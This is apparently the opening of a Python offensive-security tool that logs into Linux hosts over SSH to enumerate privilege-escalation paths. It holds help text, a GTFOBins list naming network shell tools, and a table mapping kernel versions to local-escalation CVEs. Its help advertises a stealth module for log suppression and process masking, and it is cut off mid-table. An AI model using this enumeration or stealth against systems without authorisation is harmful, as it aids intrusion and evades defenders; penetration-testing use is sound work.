#!/usr/bin/python3

# <@byt3n33dl3> from byt3n33dl3.github.io (AdverXarial).
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.

import argparse
import importlib
import json
import os
import sys
import time
import socket
from datetime import datetime, timezone

try:
    import paramiko
except ImportError:
    print("\033[1;31m[!]\033[0m paramiko not installed!! Run: pip3 install paramiko")
    sys.exit(1)

BP_VERSION    = "1.5.5"
SUITE_VERSION = "2.0.3"

RESET   = "\033[0m"
BRED    = "\033[1;31m"
BORANGE = "\033[1;33m"
ORANGE  = "\033[0;33m"
WHITE   = "\033[1;37m"
GREY    = "\033[0;37m"
DGREY   = "\033[2;37m"
BGREEN  = "\033[1;32m"

NO_COLOR = False

MODULES_DIR = os.path.join(os.path.dirname(__file__), "modules")

BUILTIN_MODULES = {
    "sacspengu": "Compiler and Binary Analysis suggestor",
    "avrisk":    "Anti-Virus Discovery!!",
    "brace":     "Container and Cloud Assessor",
    "kernel":    "Kernel and LPE CVE's checklists!!",
    "mi6":       "Stealth collection mode - log suppression and process masking",
}


def c(color, text):
    if NO_COLOR:
        return str(text)
    return f"{color}{text}{RESET}"

def log_info(msg):
    print(f"  {c(BORANGE, '[*]')}  {c(WHITE, msg)}")

def log_ok(msg):
    print(f"  {c(BGREEN, '[+]')}  {c(WHITE, msg)}")

def log_err(msg):
    print(f"  {c(BRED, '[!]')}  {c(WHITE, msg)}")

def log_dim(msg):
    print(f"  {c(DGREY, '[-]')}  {c(DGREY, msg)}")

def log_find(tier, collector, detail):
    if tier == "CRITICAL":
        tier_str = c(BRED,    f"[{'CRITICAL':<8}]")
    elif tier == "HIGH":
        tier_str = c(BORANGE, f"[{'HIGH':<8}]")
    else:
        tier_str = c(ORANGE,  f"[{'POTENTIAL':<8}]")
    print(f"  {tier_str}  {c(BORANGE, f'{collector:<14}')}  {c(WHITE, detail)}")

def log_verbose(collector, key, val):
    print(f"  {c(DGREY, '    ~')}  {c(DGREY, f'{collector:<16}')}  {c(DGREY, f'{key}:')}  {c(GREY, str(val)[:120])}")

def banner():
    print()
    print(c(BORANGE, "         _  __        ___  __             _____                                "))
    print(c(BORANGE, "   ___ _| |/_/_______/ _ )/ /__  ___  ___/ / _ \\___ ___  ___ ___ __  ___  __ __"))
    print(c(BRED, "  / _ `/>  </ __/___/ _  / / _ \\/ _ \\/ _  / ___/ -_) _ \\/ _ `/ // / / _ \\/ // /"))
    print(c(BORANGE, "  \\_, /_/|_|\\__/   /____/_/\\___/\\___/\\_,_/_/   \\__/_//_/\\_, /\\_,_(_) .__/\\_, / "))
    print(c(BORANGE, " /___/                                                 /___/      /_/   /___/  "))
    print()
    print(c(BRED,    "                           v1.5.5 [SuSHi Rav3n]                          "))
    print()
    print(f"  {c(BORANGE, 'gxc-BloodPengu.py')} {c(DGREY, f'v{BP_VERSION}')} {c(DGREY, '|')} {c(BORANGE, 'by <@byt3n33dl3>')}")
    print(f"  {c(DGREY, 'Data collector in Python for BloodPengu APM')}")
    print()

def divider():
    print(f"  {c(DGREY, '-' * 70)}")
    print()

def get_available_modules():
    mods = dict(BUILTIN_MODULES)
    if os.path.isdir(MODULES_DIR):
        for fname in os.listdir(MODULES_DIR):
            if fname.endswith(".py") and fname != "__init__.py":
                mname = fname[:-3]
                if mname not in mods:
                    mods[mname] = "Community module"
    return mods

def load_module(name):
    mod_path = os.path.join(MODULES_DIR, f"{name}.py")
    if not os.path.exists(mod_path):
        return None
    spec   = importlib.util.spec_from_file_location(name, mod_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

def print_help():
    banner()
    print(f"{c(BORANGE, '  Usage:')}")
    print(f"    {c(WHITE, 'bloodpengu-python')} {c(ORANGE, '<target>')} {c(DGREY, '[options]')}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"{c(BORANGE, '  Authentication:')}  {c(DGREY, '(required one of -p or -k)')}")
    print()
    print(f"    {c(BORANGE, '-u')} {c(WHITE, 'USERNAME')}          {c(DGREY, 'SSH username')}")
    print(f"    {c(BORANGE, '-p')} {c(WHITE, 'PASSWORD')}          {c(DGREY, 'Authenticate with password')}")
    print(f"    {c(BORANGE, '-k')} {c(WHITE, 'KEY_FILE')}          {c(DGREY, 'Authenticate with RSA/PEM private key  ')}{c(ORANGE, '(e.g. id_rsa, key.pem)')}")
    print()
    print(f"{c(BORANGE, '  Target Options:')}")
    print()
    print(f"    {c(BORANGE, '-d')} {c(WHITE, 'DOMAIN')}            {c(DGREY, 'Domain or hostname  ')}{c(ORANGE, '(stored in output for BloodPengu context)')}")
    print(f"    {c(BORANGE, '--port')} {c(WHITE, 'PORT')}          {c(DGREY, 'SSH port  ')}{c(ORANGE, '(default: 22)')}")
    print(f"    {c(BORANGE, '--old-ssh')}            {c(DGREY, 'Enable legacy SSH algorithms  ')}{c(ORANGE, '(for old OpenSSH targets)')}")
    print(f"    {c(BORANGE, '--jumphost')} {c(WHITE, 'HOST')}      {c(DGREY, 'Pivot via jump host  ')}{c(ORANGE, '(format: user:pass@host:port)')}")
    print(f"    {c(BORANGE, '--jumphost-key')} {c(WHITE, 'FILE')}  {c(DGREY, 'Key file for jump host auth')}")
    print()
    print(f"{c(BORANGE, '  Modules:')}  {c(DGREY, '(all collectors run by default, use -M to run one only)')}")
    print()
    print(f"    {c(BORANGE, '-M')} {c(WHITE, 'MODULE')}            {c(DGREY, 'Run a specific module only')}")
    print()
    print(f"    {c(DGREY, '    Available modules:')}")
    available = get_available_modules()
    for mname, mdesc in available.items():
        print(f"    {c(BORANGE, f'    {mname:<16}')}  {c(DGREY, mdesc)}")
    print()
    print(f"{c(BORANGE, '  Output:')}")
    print()
    print(f"    {c(BORANGE, '-o')} {c(WHITE, 'OUTPUT_FILE')}       {c(DGREY, 'Write JSON to file  ')}{c(ORANGE, '(default: pypengu-output.json)')}")
    print(f"    {c(BORANGE, '-v')}                   {c(DGREY, 'Verbosity as each collector result as it arrives')}")
    print(f"    {c(BORANGE, '--no-color')}           {c(DGREY, 'Disable color output')}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"{c(BORANGE, '  Examples:')}")
    print()
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -k ~/.ssh/id_rsa')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -k ~/.ssh/id_rsa --port 2222')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -d kraken.htb -v')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -M sacspengu')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -M avrisk')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -M brace')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -M kernel')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -M mi6')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -k id_rsa -o ./results/kraken.json')}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"{c(BORANGE, '  Collectors:')}  {c(DGREY, '(all run by default unless -M is specified)')}")
    print()
    collectors = [
        ("users",      "COLLECT",  "Local users, UID 0 accounts, /etc/passwd, /etc/group"),
        ("sudo",       "COLLECT",  "NOPASSWD rules, dangerous sudo binaries, misconfigs"),
        ("suid",       "COLLECT",  "SUID and SGID binaries with GTFOBins cross-reference"),
        ("groups",     "COLLECT",  "Privileged groups - docker, lxd, disk, shadow, adm"),
        ("services",   "COLLECT",  "Writable systemd units, hijackable service scripts"),
        ("cron",       "COLLECT",  "Writable cron scripts, scheduled task privilege paths"),
        ("kernel",     "COLLECT",  "Kernel version matched against known CVE list"),
        ("containers", "ESCAPE",   "Docker socket, LXD membership, cloud credentials, K8s"),
        ("network",    "RECON",    "Listening ports, interfaces, internal network range"),
        ("env",        "DISCOVER", "Env vars, history files, interesting files in home/opt"),
        ("sacspengu",  "COMPILE",  "Compilers, writable PATH/lib dirs, capabilities, build files"),
        ("avrisk",     "RECON",    "Anti-Virus Discovery!!"),
        ("brace",      "ESCAPE",   "Container and Cloud Assessor"),
        ("kernel",     "RECON",    "Kernel and LPE CVE's checklists!!"),
    ]
    print(f"    {c(BORANGE, f'{'Collector':<14}')}  {c(DGREY, f'{'Role':<10}')}  {c(WHITE, 'Description')}")
    print(f"    {c(DGREY, '-' * 13)}  {c(DGREY, '-' * 9)}  {c(DGREY, '-' * 52)}")
    for name, role, desc in collectors:
        rc = BRED if role == "ESCAPE" else BORANGE if role in ("COLLECT", "COMPILE") else ORANGE
        print(f"    {c(BORANGE, f'{name:<14}')}  {c(rc, f'{role:<10}')}  {c(DGREY, desc)}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"  {c(DGREY, 'Output lands on attacker machine as pypengu-output.json')}")
    print(f"  {c(DGREY, 'Import directly into BloodPengu!!')}")
    print()
    print(f"  {c(DGREY, 'gxc-BloodPengu.py')} v{BP_VERSION} by <@byt3n33dl3> {c(BORANGE, '<github.com/byt3n33dl3/gxc-BloodPengu.py>')}")
    print()


GTFOBINS = [
    "nmap","vim","vi","nano","less","more","man","awk","gawk",
    "perl","python","python3","python2","ruby","lua","irb","php","node",
    "find","cp","mv","cat","tee","head","tail","cut","sort",
    "bash","sh","dash","zsh","ksh","csh","tcsh",
    "tar","zip","unzip","gzip","bzip2","xz",
    "curl","wget","ftp","tftp","nc","netcat","ncat",
    "gcc","make","cc","as","ld",
    "git","svn","hg",
    "docker","lxc","runc","podman",
    "strace","ltrace","gdb",
    "socat","ssh","scp","rsync",
    "env","nice","ionice","timeout",
    "systemctl","journalctl","loginctl",
    "mount","umount",
    "apt","apt-get","yum","dnf","pip","pip3","gem",
    "mysql","psql","sqlite3",
    "base64","xxd","od",
    "openssl","gpg",
    "sed","tr","xargs",
    "screen","tmux",
    "watch","at",
    "chroot","nsenter",
    "taskset","prlimit",
]

PRIV_GROUPS = {
    "sudo":             "critical",
    "wheel":            "critical",
    "admin":            "high",
    "root":             "critical",
    "docker":           "critical",
    "lxd":              "critical",
    "lxc":              "critical",
    "libvirt":          "high",
    "disk":             "critical",
    "shadow":           "critical",
    "adm":              "medium",
    "staff":            "medium",
    "video":            "low",
    "plugdev":          "low",
    "kvm":              "medium",
    "vboxusers":        "low",
    "dialout":          "low",
    "dip":              "low",
    "netdev":           "low",
    "bluetooth":        "low",
    "systemd-journal":  "medium",
    "systemd-network":  "medium",
    "utmp":             "low",
    "utmpx":            "low",
}

KERNEL_CVES = {

    "2.4.22": [
        ("CVE-2003-0985", "critical", "Linux mremap() boundary check LPE",                        "https://nvd.nist.gov/vuln/detail/CVE-2003-0985"),
    ],
    "2.4.29": [
        ("CVE-2005-0736", "high",     "Linux ptrace privilege escalation",                        "https://nvd.nist.gov/vuln/detail/CVE-2005-0736"),
    ],
    "2.6.9":  [
        ("CVE-2004-1235", "critical", "Linux uselib() privilege escalation",                      "https://nvd.nist.gov/vuln/detail/CVE-2004-1235"),
        ("CVE-2005-0001", "high",     "Linux i386 SMP page fault handler LPE",                   "https://nvd.nist.gov/vuln/detail/CVE-2005-0001"),
    ],
    "2.6.17": [
        ("CVE-2006-2451", "critical", "Linux prctl() privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2006-2451"),
    ],
    "2.6.18": [
        ("CVE-2007-4573", "critical", "Linux x86_64 ptrace privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2007-4573"),
        ("CVE-2008-0600", "critical", "Linux vmsplice privilege escalation",                      "https://nvd.nist.gov/vuln/detail/CVE-2008-0600"),
        ("CVE-2008-4210", "high",     "Linux open() O_EXCL privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2008-4210"),
    ],
    "2.6.22": [
        ("CVE-2008-0600", "critical", "Linux vmsplice privilege escalation",                      "https://nvd.nist.gov/vuln/detail/CVE-2008-0600"),
        ("CVE-2009-1185", "critical", "Linux udevd netlink privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2009-1185"),
        ("CVE-2012-0056", "high",     "Linux /proc/pid/mem privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2012-0056"),
    ],
    "2.6.24": [
        ("CVE-2009-1185", "critical", "Linux udevd netlink privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2009-1185"),
        ("CVE-2009-2692", "critical", "Linux sock_sendpage NULL ptr dereference LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2009-2692"),
    ],
    "2.6.28": [
        ("CVE-2009-2692", "critical", "Linux sock_sendpage NULL ptr dereference LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2009-2692"),
        ("CVE-2010-1146", "high",     "Linux ReiserFS privilege escalation",                      "https://nvd.nist.gov/vuln/detail/CVE-2010-1146"),
    ],
    "2.6.30": [
        ("CVE-2010-2959", "high",     "Linux CAN BCM privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2010-2959"),
        ("CVE-2010-3081", "critical", "Linux 64-bit compat syscall privilege escalation",         "https://nvd.nist.gov/vuln/detail/CVE-2010-3081"),
    ],
    "2.6.32": [
        ("CVE-2010-3081", "critical", "Linux 64-bit compat syscall privilege escalation",         "https://nvd.nist.gov/vuln/detail/CVE-2010-3081"),
        ("CVE-2010-3904", "critical", "Linux RDS protocol privilege escalation",                  "https://nvd.nist.gov/vuln/detail/CVE-2010-3904"),
        ("CVE-2012-0056", "high",     "Linux /proc/pid/mem privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2012-0056"),
        ("CVE-2013-2094", "critical", "Linux perf_events privilege escalation",                   "https://nvd.nist.gov/vuln/detail/CVE-2013-2094"),
        ("CVE-2014-4699", "high",     "Linux ptrace privilege escalation",                        "https://nvd.nist.gov/vuln/detail/CVE-2014-4699"),
    ],
    "2.6.36": [
        ("CVE-2010-4258", "critical", "Linux kernel do_exit() privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2010-4258"),
    ],
    "2.6.39": [
        ("CVE-2011-1770", "high",     "Linux DCCP privilege escalation",                          "https://nvd.nist.gov/vuln/detail/CVE-2011-1770"),
    ],
    "3.0.0":  [
        ("CVE-2012-0056", "high",     "Linux /proc/pid/mem privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2012-0056"),
        ("CVE-2013-2094", "critical", "Linux perf_events privilege escalation",                   "https://nvd.nist.gov/vuln/detail/CVE-2013-2094"),
    ],
    "3.2.0":  [
        ("CVE-2013-2094", "critical", "Linux perf_events privilege escalation",                   "https://nvd.nist.gov/vuln/detail/CVE-2013-2094"),
        ("CVE-2014-0038", "high",     "Linux recvmmsg privilege escalation",                      "https://nvd.nist.gov/vuln/detail/CVE-2014-0038"),
        ("CVE-2015-1328", "critical", "Ubuntu overlayfs local privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-1328"),
    ],
    "3.4.0":  [
        ("CVE-2013-2094", "critical", "Linux perf_events privilege escalation",                   "https://nvd.nist.gov/vuln/detail/CVE-2013-2094"),
        ("CVE-2013-1858", "high",     "Linux clone() privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2013-1858"),
    ],
    "3.8.0":  [
        ("CVE-2013-2094", "critical", "Linux perf_events privilege escalation",                   "https://nvd.nist.gov/vuln/detail/CVE-2013-2094"),
        ("CVE-2014-3153", "critical", "Linux futex privilege escalation - Towelroot",             "https://nvd.nist.gov/vuln/detail/CVE-2014-3153"),
    ],
    "3.10.0": [
        ("CVE-2014-3153", "critical", "Linux futex privilege escalation - Towelroot",             "https://nvd.nist.gov/vuln/detail/CVE-2014-3153"),
        ("CVE-2014-4699", "high",     "Linux ptrace privilege escalation",                        "https://nvd.nist.gov/vuln/detail/CVE-2014-4699"),
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2017-7308", "high",     "Linux packet_set_ring privilege escalation",               "https://nvd.nist.gov/vuln/detail/CVE-2017-7308"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    "3.13.0": [
        ("CVE-2015-1328", "critical", "Ubuntu overlayfs local privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-1328"),
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2014-3153", "critical", "Linux futex privilege escalation - Towelroot",             "https://nvd.nist.gov/vuln/detail/CVE-2014-3153"),
    ],
    "3.16.0": [
        ("CVE-2015-1328", "critical", "Ubuntu overlayfs local privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-1328"),
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2015-8660", "high",     "Linux overlayfs setuid privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-8660"),
    ],
    "3.19.0": [
        ("CVE-2015-1328", "critical", "Ubuntu overlayfs local privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-1328"),
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2015-8660", "high",     "Linux overlayfs setuid privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-8660"),
    ],
    "4.2.0":  [
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2015-8660", "high",     "Linux overlayfs setuid privilege escalation",              "https://nvd.nist.gov/vuln/detail/CVE-2015-8660"),
    ],
    "4.3.0":  [
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
    ],
    "4.4.0":  [
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2017-7308", "high",     "Linux packet_set_ring privilege escalation",               "https://nvd.nist.gov/vuln/detail/CVE-2017-7308"),
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    "4.8.0":  [
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",           "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
        ("CVE-2017-7308", "high",     "Linux packet_set_ring privilege escalation",               "https://nvd.nist.gov/vuln/detail/CVE-2017-7308"),
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
    ],
    "4.9.0":  [
        ("CVE-2017-7308", "high",     "Linux packet_set_ring privilege escalation",               "https://nvd.nist.gov/vuln/detail/CVE-2017-7308"),
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    "4.10.0": [
        ("CVE-2017-7308", "high",     "Linux packet_set_ring privilege escalation",               "https://nvd.nist.gov/vuln/detail/CVE-2017-7308"),
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
    ],
    "4.13.0": [
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
        ("CVE-2017-1000112","critical","Linux UDP fragmentation offload privilege escalation",     "https://nvd.nist.gov/vuln/detail/CVE-2017-1000112"),
    ],
    "4.14.0": [
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",                 "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
        ("CVE-2017-1000405","high",   "Huge Dirty COW - huge page privilege escalation",          "https://nvd.nist.gov/vuln/detail/CVE-2017-1000405"),
        ("CVE-2018-18955","high",     "Linux user namespace privilege escalation",                "https://nvd.nist.gov/vuln/detail/CVE-2018-18955"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    "4.15.0": [
        ("CVE-2018-18955","high",     "Linux user namespace privilege escalation",                "https://nvd.nist.gov/vuln/detail/CVE-2018-18955"),
        ("CVE-2019-13272","high",     "PTRACE_TRACEME pkexec local privilege escalation",         "https://nvd.nist.gov/vuln/detail/CVE-2019-13272"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
    ],
    "4.18.0": [
        ("CVE-2018-18955","high",     "Linux user namespace privilege escalation",                "https://nvd.nist.gov/vuln/detail/CVE-2018-18955"),
        ("CVE-2019-13272","high",     "PTRACE_TRACEME pkexec local privilege escalation",         "https://nvd.nist.gov/vuln/detail/CVE-2019-13272"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    #5.x era
    "5.0.0":  [
        ("CVE-2019-13272","high",     "PTRACE_TRACEME pkexec local privilege escalation",         "https://nvd.nist.gov/vuln/detail/CVE-2019-13272"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    "5.3.0":  [
        ("CVE-2019-14287","high",     "Sudo bypass via user ID -1",                               "https://nvd.nist.gov/vuln/detail/CVE-2019-14287"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
    ],
    "5.4.0":  [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2021-22555","critical", "Linux netfilter heap out-of-bounds write LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2021-22555"),
        ("CVE-2022-1015", "high",     "Linux netfilter nf_tables out-of-bounds write",            "https://nvd.nist.gov/vuln/detail/CVE-2022-1015"),
        ("CVE-2023-0179", "high",     "Linux netfilter nftables stack overflow LPE",              "https://nvd.nist.gov/vuln/detail/CVE-2023-0179"),
    ],
    "5.6.0":  [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-22555","critical", "Linux netfilter heap out-of-bounds write LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2021-22555"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
    ],
    "5.8.0":  [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2021-22555","critical", "Linux netfilter heap out-of-bounds write LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2021-22555"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2022-25636","high",     "Netfilter heap out-of-bounds write",                       "https://nvd.nist.gov/vuln/detail/CVE-2022-25636"),
    ],
    "5.10.0": [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                          "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2022-1015", "high",     "Linux netfilter nf_tables out-of-bounds write",            "https://nvd.nist.gov/vuln/detail/CVE-2022-1015"),
        ("CVE-2022-34918","critical", "Linux netfilter nf_tables type confusion LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-34918"),
        ("CVE-2023-0179", "high",     "Linux netfilter nftables stack overflow LPE",              "https://nvd.nist.gov/vuln/detail/CVE-2023-0179"),
        ("CVE-2023-32629","critical", "Ubuntu GameOver(lay) overlayfs privilege escalation",      "https://nvd.nist.gov/vuln/detail/CVE-2023-32629"),
        ("CVE-2023-2640", "critical", "Ubuntu GameOver(lay) overlayfs privilege escalation",      "https://nvd.nist.gov/vuln/detail/CVE-2023-2640"),
    ],
    "5.11.0": [
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2022-1015", "high",     "Linux netfilter nf_tables out-of-bounds write",            "https://nvd.nist.gov/vuln/detail/CVE-2022-1015"),
    ],
    "5.13.0": [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                       "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2022-1015", "high",     "Linux netfilter nf_tables out-of-bounds write",            "https://nvd.nist.gov/vuln/detail/CVE-2022-1015"),
        ("CVE-2022-34918","critical", "Linux netfilter nf_tables type confusion LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-34918"),
        ("CVE-2023-32629","critical", "Ubuntu GameOver(lay) overlayfs privilege escalation",      "https://nvd.nist.gov/vuln/detail/CVE-2023-32629"),
        ("CVE-2023-2640", "critical", "Ubuntu GameOver(lay) overlayfs privilege escalation",      "https://nvd.nist.gov/vuln/detail/CVE-2023-2640"),
    ],
    "5.15.0": [
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2022-1015", "high",     "Linux netfilter nf_tables out-of-bounds write",            "https://nvd.nist.gov/vuln/detail/CVE-2022-1015"),
        ("CVE-2022-34918","critical", "Linux netfilter nf_tables type confusion LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-34918"),
        ("CVE-2022-2586", "high",     "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2022-2586"),
        ("CVE-2023-32629","critical", "Ubuntu GameOver(lay) overlayfs privilege escalation",      "https://nvd.nist.gov/vuln/detail/CVE-2023-32629"),
        ("CVE-2023-2640", "critical", "Ubuntu GameOver(lay) overlayfs privilege escalation",      "https://nvd.nist.gov/vuln/detail/CVE-2023-2640"),
        ("CVE-2023-4147", "high",     "Linux netfilter nf_tables use-after-free",                 "https://nvd.nist.gov/vuln/detail/CVE-2023-4147"),
        ("CVE-2024-1086", "critical", "Linux netfilter nf_tables use-after-free LPE",             "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"),
    ],
    "5.16.0": [
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
        ("CVE-2022-25636","high",     "Netfilter heap out-of-bounds write",                       "https://nvd.nist.gov/vuln/detail/CVE-2022-25636"),
